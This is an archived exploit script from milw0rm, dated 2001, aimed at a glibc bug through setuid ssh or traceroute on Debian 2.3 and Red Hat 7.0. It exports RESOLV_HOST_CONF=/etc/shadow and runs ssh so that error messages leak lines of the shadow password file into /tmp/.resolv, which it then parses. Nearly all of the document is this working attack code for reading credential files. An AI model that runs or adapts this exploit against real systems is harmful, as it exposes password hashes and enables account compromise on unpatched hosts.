<html><head><title>glibc-2.2 and openssh-2.3.0p1 exploits glibc >= 2.1.9x</title></head><pre># Charles Stevenson &lt;csteven@newhope.terraplex.com&gt;
# glibc-2.2 and openssh-2.3.0p1 (Debian 2.3 , Redhat 7.0)
# This exploits is for glibc &gt;= 2.1.9x.
# (****krochos@linuxmail.org****)
# Edit this if you have a problem with path

ssh=/usr/bin/ssh
traceroute=/usr/sbin/traceroute
FILE=/etc/shadow        # File to read
###############################################################################

echo &quot;$ssh&quot;
echo &quot;[*] Checking permisions...&quot;

if [ ! -u $ssh ]; then
        echo &quot;$ssh is NOT setuid on this system or does not exist at all!&quot;
        if [ ! -u $traceroute ]; then
          echo &quot;$traceroute is NOT setuid on this system or does not exist at all!&quot;
          exit 0
        fi
fi

export RESOLV_HOST_CONF=$FILE

echo &quot;[*] Glibc bug found by Charles Stevenson &lt;csteven@NEWHOPE.TERRAPLEX.COM&gt;&quot;
echo &quot;[*] krochos@linuxmail.org&quot;
sleep 1
echo &quot;[*] export  RESOLV_HOST_CONF=/etc/shadow&quot;
ssh lt 2&gt;/tmp/.resolv
cat /tmp/.resolv |  cut -d&quot;\`&quot; -f5,2 | awk -F&quot;\'&quot; '{print $1} '

# milw0rm.com [2001-01-25]</pre></html>